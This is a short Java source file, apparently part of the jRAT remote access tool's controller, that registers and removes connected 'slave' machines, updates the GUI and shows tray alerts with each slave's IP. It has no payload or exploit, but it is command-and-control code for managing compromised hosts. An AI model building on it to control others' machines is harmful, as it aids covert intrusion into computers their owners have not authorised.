package se.jrat.controller.net;

import se.jrat.controller.AbstractSlave;
import se.jrat.controller.Main;
import se.jrat.controller.SampleMode;
import se.jrat.controller.addons.PluginEventHandler;
import se.jrat.controller.exceptions.CloseException;
import se.jrat.controller.exceptions.DuplicateSlaveException;
import se.jrat.controller.utils.TrayIconUtils;

public class ConnectionHandler {

	public synchronized static void addSlave(AbstractSlave slave) {
		if (slave.isAdded()) {
			slave.disconnect(new DuplicateSlaveException());
		} else {
			slave.setAdded(true);
			Main.connections.add(slave);

			Main.instance.getPanelClients().addSlave(slave);

			String title = Main.formatTitle();
			Main.instance.setTitle(title);

			TrayIconUtils.setToolTip(title);
			TrayIconUtils.showMessage(title, slave.getIP() + " connected");

			PluginEventHandler.onConnect(slave);
		}	
	}

	public synchronized static void removeSlave(AbstractSlave client, Exception e) {
		if (SampleMode.isInSampleMode()) {
			return;
		}

		Main.connections.remove(client);

		String title = Main.formatTitle();
		Main.instance.setTitle(title);
		TrayIconUtils.setToolTip(title);
		client.closeSocket(new CloseException("Removing connection..."));
		
		Main.instance.getPanelClients().removeSlave(client);
	}

}
